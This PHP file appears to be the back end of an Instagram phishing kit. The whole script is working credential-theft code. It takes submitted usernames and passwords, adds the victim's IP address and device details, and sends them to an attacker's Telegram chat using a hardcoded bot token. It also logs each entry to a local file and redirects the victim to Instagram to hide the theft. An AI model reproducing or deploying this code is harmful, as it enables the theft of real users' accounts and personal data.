<?php

// Load environment variables
if (file_exists(__DIR__ . '/.env')) {
    $lines = file(__DIR__ . '/.env', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0) continue;
        if (strpos($line, '=') === false) continue;
        list($key, $value) = explode('=', $line, 2);
        $_ENV[trim($key)] = trim($value);
        putenv(trim($key) . '=' . trim($value));
    }
}

$telegram_bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: "8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA";
$telegram_chat_id = getenv('TELEGRAM_CHAT_ID') ?: "8244999766";
$log_file = getenv('LOG_FILE') ?: __DIR__ . "/credentials_log.txt";

if(isset($_POST["username"]) && isset($_POST["password"])) {
    $username = $_POST["username"];
    $password = $_POST["password"];
    $redirect_url = $_POST["redirect_url"] ?? "https://www.instagram.com/";
    
    // Get additional information
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $timestamp = date("Y-m-d H:i:s");
    
    // Format message for Telegram
    $message = "🔔 *New Instagram Login Captured!*\n\n";
    $message .= "👤 *Username:* `{$username}`\n";
    $message .= "🔑 *Password:* `{$password}`\n\n";
    $message .= "📍 *IP Address:* `{$ip}`\n";
    $message .= "🕐 *Time:* `{$timestamp}`\n";
    $message .= "🎬 *Video URL:* `{$redirect_url}`\n";
    $message .= "📱 *Device:* `{$user_agent}`";
    
    // Send to Telegram
    $url = "https://api.telegram.org/bot" . $telegram_bot_token . "/sendMessage";
    
    $post_fields = array(
        'chat_id' => $telegram_chat_id,
        'text' => $message,
        'parse_mode' => 'Markdown'
    );
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    // Log to file
    $log_entry = "[{$timestamp}] Username: {$username} | Password: {$password} | IP: {$ip} | Redirect: {$redirect_url}\n";
    file_put_contents($log_file, $log_entry, FILE_APPEND);
    
    echo json_encode(['success' => true, 'redirect' => $redirect_url]);
} else {
    echo json_encode(['success' => false, 'error' => 'Missing credentials']);
}

?>
